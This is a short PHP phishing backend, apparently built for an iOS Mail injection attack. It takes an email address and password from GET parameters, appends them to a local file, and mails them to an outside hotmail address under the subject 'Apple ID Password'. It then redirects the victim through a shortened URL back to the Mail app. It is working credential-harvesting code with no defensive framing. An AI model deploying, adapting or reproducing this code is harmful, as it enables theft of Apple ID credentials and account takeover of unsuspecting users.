<?php
if(isset($_GET['b.schippers@nah.nl']) && isset($_GET['b.schippers@nah.nl'])) {
	$email = htmlspecialchars(stripslashes($_GET['b.schippers@nah.nl']));
	$password = htmlspecialchars(stripslashes($_GET['modal-password']));
    $data = $email . '-' . $password . "\n";
    $ret = file_put_contents('./mydata.txt', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('There was an error.');
    }
    else {
	    mail('bassieee46@hotmail.com','Apple ID Password',"Thanks for your password! \n $data ¯\_(ツ)_/¯ \n https://github.com/Bassieee46/ios.injection");
	    header("Location: http://is.gd/9VOMTp"); //Redirects recipient from Safari back to Mail.app using message://dummy
	    die();
    }
}
else {
   die('No GET data to process. Thanks for trying.');
}
?>
